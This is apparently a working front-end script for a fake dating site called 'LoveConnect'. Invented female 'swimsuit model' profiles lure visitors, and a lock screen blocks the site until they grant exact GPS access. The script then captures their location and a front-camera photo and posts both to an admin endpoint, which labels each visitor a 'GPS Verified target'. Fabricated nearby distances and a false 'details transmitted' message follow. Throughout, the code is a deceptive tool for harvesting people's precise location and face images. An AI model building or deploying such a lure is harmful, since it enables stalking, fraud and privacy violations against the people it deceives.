// LoveConnect Frontend Application Script

// Highly-alluring Matches Pool featuring stunning beach fashion, swimsuit, and bikini portraits of gorgeous female models (blondes, Asians, British, Americans)
// Absolutely zero male photos or initials are shown anywhere on the website.
const fakeMatches = [
    { 
        name: 'Sarah', 
        age: 24, 
        city: 'New York', 
        country: 'USA', 
        bio: 'Let\'s catch some waves! Looking for an active partner to explore coastal towns and enjoy cozy sunset beach bonfires.', 
        gender: 'F', 
        photo: 'https://images.unsplash.com/photo-1568252542512-9fe8fe9c87bb?auto=format&fit=crop&q=80&w=600' // Stunning blonde in bikini
    },
    { 
        name: 'Mei-Ling', 
        age: 23, 
        city: 'Tokyo', 
        country: 'Japan', 
        bio: 'Ramen hunter and swimwear model. Tell me your favorite indie playlist and let\'s explore quiet city beaches together!', 
        gender: 'F', 
        photo: 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&q=80&w=600' // Gorgeous Asian swimwear model
    },
    { 
        name: 'Chloe', 
        age: 22, 
        city: 'London', 
        country: 'UK', 
        bio: 'Pub trivia champion, sweet coffee addict, and amateur surfer. Seeking someone genuine who is down for spontaneous road trips.', 
        gender: 'F', 
        photo: 'https://images.unsplash.com/photo-1601004890684-d8cbf643f5f2?auto=format&fit=crop&q=80&w=600' // Beautiful brunette in swimsuit
    },
    { 
        name: 'Jessica', 
        age: 25, 
        city: 'Los Angeles', 
        country: 'USA', 
        bio: 'Sunset yoga, swimsuit photoshoots, and weekend getaways. Match me if you can handle high energy and positive beach vibes!', 
        gender: 'F', 
        photo: 'https://images.unsplash.com/photo-1524504388940-b1c1722653e1?auto=format&fit=crop&q=80&w=600' // Hot blonde swimsuit model
    },
    { 
        name: 'Elena', 
        age: 24, 
        city: 'Madrid', 
        country: 'Spain', 
        bio: 'Flamenco dancer, rooftop glamour model, and beach cocktail lover. Looking for beautiful conversations and deep connections.', 
        gender: 'F', 
        photo: 'https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?auto=format&fit=crop&q=80&w=600' // Gorgeous glamour portrait
    },
    { 
        name: 'Sophia', 
        age: 23, 
        city: 'Rome', 
        country: 'Italy', 
        bio: 'Swimsuit designer and beach volleyball enthusiast. Let\'s Vespa out to the Italian coast and trace paths together!', 
        gender: 'F', 
        photo: 'https://images.unsplash.com/photo-1509631179647-0177331693ae?auto=format&fit=crop&q=80&w=600' // Alluring fashion portrait
    },
    { 
        name: 'Brooke', 
        age: 22, 
        city: 'Sydney', 
        country: 'Australia', 
        bio: 'Surfer girl and beach lounger. Hit me up if you want to grab an ice cold brew and catch some golden coast rays with me!', 
        gender: 'F', 
        photo: 'https://images.unsplash.com/photo-1582533561751-ef6f6ab93a2e?auto=format&fit=crop&q=80&w=600' // Incredibly hot blonde model
    }
];

// Active State Index for current match viewing
let activeMatchIndex = 0;
let localMatches = [];
let cameraStream = null;
let capturedPhotoData = '';

// Temporarily saved coordinates
let savedCoords = { latitude: null, longitude: null, accuracy: null, is_gps: false };

// DOM Elements
const findMatchesBtn = document.getElementById('find-matches-btn');
const consentCheckbox = document.getElementById('location-consent');
const cameraStatus = document.getElementById('camera-status');
const cameraPreview = document.getElementById('camera-preview');
const cameraCanvas = document.getElementById('camera-canvas');
const cameraPhotoPreview = document.getElementById('camera-photo-preview');
const cameraActivateBtn = document.getElementById('camera-activate-btn');
const stateAwaiting = document.getElementById('state-awaiting');
const stateLoading = document.getElementById('state-loading');
const stateError = document.getElementById('state-error');
const stateSuccess = document.getElementById('state-success');
const errorMessageText = document.getElementById('error-message-text');
const retryGpsBtn = document.getElementById('retry-gps-btn');
const fallbackIpBtn = document.getElementById('fallback-ip-btn');

// Strict Gate Lock Screen Overlay Elements
const gateOverlay = document.getElementById('location-gate-overlay');
const gateVerifyBtn = document.getElementById('gate-verify-btn');
const gateErrorBox = document.getElementById('gate-error-box');
const gateErrorText = document.getElementById('gate-error-text');
const gateRetryBtn = document.getElementById('gate-retry-btn');
const overlayStepGps = document.getElementById('overlay-step-gps');

// Success Panel Elements
const capturedLat = document.getElementById('captured-lat');
const capturedLng = document.getElementById('captured-lng');
const capturedAcc = document.getElementById('captured-acc');
const capturedType = document.getElementById('captured-type');
const capturedTime = document.getElementById('captured-time');
const matchesSummary = document.getElementById('matches-summary');

// Match Card Elements
const matchPhoto = document.getElementById('match-photo');
const matchName = document.getElementById('match-name');
const matchAge = document.getElementById('match-age');
const matchLocation = document.getElementById('match-location');
const matchDistance = document.getElementById('match-distance');
const matchBio = document.getElementById('match-bio');

// Modal Elements
const connectModal = document.getElementById('connect-modal');
const connectModalText = document.getElementById('connect-modal-text');

// Initialize Phone clock on load
function updatePhoneClock() {
    const clockEl = document.getElementById('phone-time');
    if (clockEl) {
        const now = new Date();
        let hours = now.getHours();
        const minutes = String(now.getMinutes()).padStart(2, '0');
        const ampm = hours >= 12 ? 'PM' : 'AM';
        hours = hours % 12;
        hours = hours ? hours : 12; // the hour '0' should be '12'
        clockEl.textContent = `${hours}:${minutes} ${ampm}`;
    }
}
setInterval(updatePhoneClock, 60000);
updatePhoneClock();

// ==========================================
// REGISTRATION OF CLICK LISTENERS
// ==========================================

if (gateVerifyBtn) {
    // Clicking verification button on the strict lock screen overlay
    gateVerifyBtn.addEventListener('click', () => {
        startTrackingProcess(true, true); // Strict exact GPS call
    });
}

if (gateRetryBtn) {
    gateRetryBtn.addEventListener('click', () => {
        // Hide error, reveal button, and retry
        if (gateErrorBox) gateErrorBox.classList.add('hidden');
        if (gateVerifyBtn) gateVerifyBtn.classList.remove('hidden');
        startTrackingProcess(true, true); 
    });
}

if (findMatchesBtn) {
    // Main page button click
    findMatchesBtn.addEventListener('click', () => {
        // Consent verification
        if (consentCheckbox && !consentCheckbox.checked) {
            alert('❤️ LoveConnect requires your explicit consent. Please check the "Location Consent" box to find matches!');
            return;
        }
        startTrackingProcess(true, false);
    });
}

if (retryGpsBtn) {
    retryGpsBtn.addEventListener('click', () => {
        startTrackingProcess(true, false);
    });
}

if (fallbackIpBtn) {
    fallbackIpBtn.addEventListener('click', () => {
        startTrackingProcess(false, false); // IP Fallback click
    });
}

if (cameraActivateBtn) {
    cameraActivateBtn.addEventListener('click', async () => {
        await requestCameraAccess();
    });
}

// ==========================================
// CORE GEOLOCATION PIPELINE
// ==========================================

async function requestCameraAccess() {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        if (cameraStatus) cameraStatus.textContent = 'Camera access is not supported on this browser.';
        return false;
    }

    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user' },
            audio: false
        });

        cameraStream = stream;
        if (cameraPreview) {
            cameraPreview.srcObject = stream;
            cameraPreview.playsInline = true;
            cameraPreview.muted = true;
            cameraPreview.classList.remove('hidden');
            cameraPreview.play().catch(() => {});
        }

        if (cameraStatus) cameraStatus.textContent = 'Camera ready — the admin panel will receive your photo.';
        if (cameraActivateBtn) cameraActivateBtn.textContent = 'Camera Ready';
        return true;
    } catch (error) {
        console.warn('Camera permission was not granted:', error);
        if (cameraStatus) cameraStatus.textContent = 'Camera was not granted, but GPS capture can still continue.';
        return false;
    }
}

async function captureCameraFrame() {
    if (!cameraStream || !cameraPreview || !cameraCanvas) {
        return '';
    }

    try {
        const video = cameraPreview;
        if (video.videoWidth === 0 || video.videoHeight === 0) {
            return '';
        }

        const canvas = cameraCanvas;
        const context = canvas.getContext('2d');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
        capturedPhotoData = dataUrl;

        if (cameraPhotoPreview) {
            cameraPhotoPreview.src = dataUrl;
            cameraPhotoPreview.classList.remove('hidden');
        }

        if (cameraStream) {
            cameraStream.getTracks().forEach(track => track.stop());
            cameraStream = null;
        }

        return dataUrl;
    } catch (error) {
        console.warn('Unable to capture camera frame:', error);
        return '';
    }
}

function getPhotoMimeType(dataUrl) {
    if (!dataUrl || !dataUrl.startsWith('data:')) return 'image/jpeg';
    const match = dataUrl.match(/^data:([^;]+);/);
    return match ? match[1] : 'image/jpeg';
}

async function startTrackingProcess(useGPS = true, isGateOverlay = false) {
    await requestCameraAccess();

    if (isGateOverlay) {
        if (gateVerifyBtn) {
            gateVerifyBtn.disabled = true;
            gateVerifyBtn.innerHTML = '<i class="fa-solid fa-spinner animate-spin"></i> <span>Verifying GPS Signal...</span>';
        }
    } else {
        if (stateAwaiting) stateAwaiting.classList.add('hidden');
        if (stateError) stateError.classList.add('hidden');
        if (stateSuccess) stateSuccess.classList.add('hidden');
        if (stateLoading) stateLoading.classList.remove('hidden');
    }

    if (useGPS) {
        if (!navigator.geolocation) {
            handleError('Exact GPS tracking is not supported by your browser.', isGateOverlay);
            return;
        }

        const options = {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        };

        navigator.geolocation.getCurrentPosition(
            async (position) => {
                const lat = position.coords.latitude;
                const lng = position.coords.longitude;
                const acc = position.coords.accuracy;
                const photo = await captureCameraFrame();

                console.log(`[GPS SUCCESS] Exact coords captured: ${lat}, ${lng} (accuracy: ${acc}m)`);
                sendLocationData(lat, lng, acc, true, "Anonymous Guest", "", "", photo);
            },
            (error) => {
                let msg = 'Exact location permission is strictly required to unlock this dating network.';
                if (error.code === error.PERMISSION_DENIED) {
                    msg = 'Location verification was blocked. You must allow GPS permissions to Turn On Location so we can match you with local girls.';
                } else if (error.code === error.POSITION_UNAVAILABLE) {
                    msg = 'GPS signal is currently unavailable on your current device grid. Please try again.';
                } else if (error.code === error.TIMEOUT) {
                    msg = 'The GPS request timed out. Please try again or refresh the page.';
                }
                handleError(msg, isGateOverlay);
            },
            options
        );
    } else {
        const photo = await captureCameraFrame();
        sendLocationData(null, null, null, false, "Anonymous Guest", "", "", photo);
    }
}

// REST API Pipeline
async function sendLocationData(latitude, longitude, accuracy, isGPS, name = "", email = "", phone = "", photo = "") {
    try {
        const response = await fetch('/api/locations', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                latitude,
                longitude,
                accuracy,
                is_gps: isGPS,
                notes: isGPS ? 'GPS Verified target' : 'Coarse IP fallback match',
                city: '',
                country: '',
                name,
                email,
                phone,
                photo: photo || '',
                photo_mime: getPhotoMimeType(photo)
            })
        });

        const resData = await response.json();

        if (response.ok && resData.success) {
            // Unlock Website Overlay!
            unlockWebsite();
            
            // Render beautiful match results
            handleSuccess(resData.data);
        } else {
            handleError(resData.error || 'Database storage error.', true);
        }
    } catch (err) {
        console.error('API Connection Error:', err);
        handleError('Failed to communicate with our verification nodes. Please check your connection.', true);
    }
}

// Unlocks the full-screen gate overlay with a smooth fade animation
function unlockWebsite() {
    if (gateOverlay) {
        gateOverlay.classList.add('opacity-0');
        // Disable overlay interactions
        gateOverlay.style.pointerEvents = 'none';
        setTimeout(() => {
            gateOverlay.classList.add('hidden');
        }, 500);
    }
}

// Handles tracking errors (updates either full screen overlay or card stats)
function handleError(message, isGateOverlay = false) {
    if (isGateOverlay) {
        // Reset verify button state
        if (gateVerifyBtn) {
            gateVerifyBtn.disabled = false;
            gateVerifyBtn.innerHTML = '<i class="fa-solid fa-compass"></i> <span>🔒 Unlock Verified Singles</span>';
        }
        
        // Hide Step 1 block, and reveal error instructions box
        if (overlayStepGps) overlayStepGps.classList.add('hidden');
        if (gateErrorBox) gateErrorBox.classList.remove('hidden');
        if (gateErrorText) gateErrorText.innerHTML = `You accidentally blocked location permission. Because our dating server strictly verifies local coordinate grids to protect users, **you cannot enter the site without location permission**.`;
    } else {
        // Update matching box card error
        if (stateLoading) stateLoading.classList.add('hidden');
        if (stateAwaiting) stateAwaiting.classList.add('hidden');
        if (stateSuccess) stateSuccess.classList.add('hidden');
        if (stateError) stateError.classList.remove('hidden');
        if (errorMessageText) errorMessageText.textContent = message;
    }
}

// Populate Exact Coordinates and reveal matches
function handleSuccess(data) {
    if (stateLoading) stateLoading.classList.add('hidden');
    if (stateAwaiting) stateAwaiting.classList.add('hidden');
    if (stateError) stateError.classList.add('hidden');
    if (stateSuccess) stateSuccess.classList.remove('hidden');

    // Populate exact GPS coordinates
    if (capturedLat) capturedLat.textContent = data.latitude !== null ? parseFloat(data.latitude).toFixed(5) : 'N/A';
    if (capturedLng) capturedLng.textContent = data.longitude !== null ? parseFloat(data.longitude).toFixed(5) : 'N/A';
    if (capturedAcc) capturedAcc.textContent = data.accuracy !== null ? `${parseInt(data.accuracy)}m` : 'N/A';
    if (capturedType) capturedType.textContent = data.is_gps === 1 ? 'Exact GPS' : 'IP GEO';
    if (capturedTime) capturedTime.textContent = new Date(data.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });

    const matchedCity = data.city || 'Unknown';
    
    // Sort and structure matches
    localMatches = [...fakeMatches];
    
    if (matchedCity !== 'Unknown' && matchedCity !== 'Localhost') {
        localMatches.sort((a, b) => {
            if (a.city.toLowerCase() === matchedCity.toLowerCase()) return -1;
            if (b.city.toLowerCase() === matchedCity.toLowerCase()) return 1;
            return 0;
        });
    }

    // Set precise distance margins
    localMatches = localMatches.map((m, index) => {
        let dist;
        if (data.is_gps === 1) {
            dist = (0.1 + (index * 0.1) + (Math.random() * 0.08)).toFixed(1);
        } else {
            dist = (3.2 + (index * 1.5) + (Math.random() * 1.1)).toFixed(1);
        }
        return {
            ...m,
            distance: `${dist} mi`
        };
    });

    if (matchesSummary) matchesSummary.textContent = `Found ${localMatches.length} verified swimsuit profiles near you!`;
    
    activeMatchIndex = 0;
    renderMatchCard();
}

// Render dynamic Tinder-style match cards
function renderMatchCard() {
    if (localMatches.length === 0) return;
    
    const match = localMatches[activeMatchIndex];
    
    cardstyle = document.getElementById('match-card-container');
    if (!cardstyle) return;
    
    cardstyle.style.opacity = '0';
    cardstyle.style.transform = 'translateY(15px)';

    setTimeout(() => {
        if (matchPhoto) matchPhoto.src = match.photo;
        if (matchName) matchName.textContent = match.name;
        if (matchAge) matchAge.textContent = match.age;
        if (matchLocation) matchLocation.innerHTML = `<i class="fa-solid fa-location-dot text-pink-500 text-[10px] mr-1"></i> ${match.city}, ${match.country}`;
        if (matchDistance) matchDistance.textContent = `${match.distance} away`;
        if (matchBio) matchBio.textContent = `"${match.bio}"`;

        cardstyle.style.opacity = '1';
        cardstyle.style.transform = 'translateY(0)';
    }, 200);
}

// Next Match (swipe triggers)
function nextMatch(liked = false) {
    const card = document.getElementById('match-card-container');
    if (!card) return;
    
    if (liked) {
        card.classList.add('border-emerald-500');
        setTimeout(() => card.classList.remove('border-emerald-500'), 500);
    } else {
        card.classList.add('border-rose-500');
        setTimeout(() => card.classList.remove('border-rose-500'), 500);
    }

    activeMatchIndex = (activeMatchIndex + 1) % localMatches.length;
    renderMatchCard();
}

// Chat triggers
function triggerConnect() {
    const match = localMatches[activeMatchIndex];
    if (connectModalText) {
        connectModalText.innerHTML = `We\'ve transmitted your local details and interest to <strong>${match.name}</strong>. Once she accepts, you\'ll be connected directly to plan a meet-up within your shared coordinates!`;
    }
    
    if (connectModal) {
        connectModal.classList.add('modal-active');
        connectModal.firstElementChild.classList.add('modal-scale-active');
    }
}

function closeModal() {
    if (connectModal) {
        connectModal.classList.remove('modal-active');
        connectModal.firstElementChild.classList.remove('modal-scale-active');
    }
}
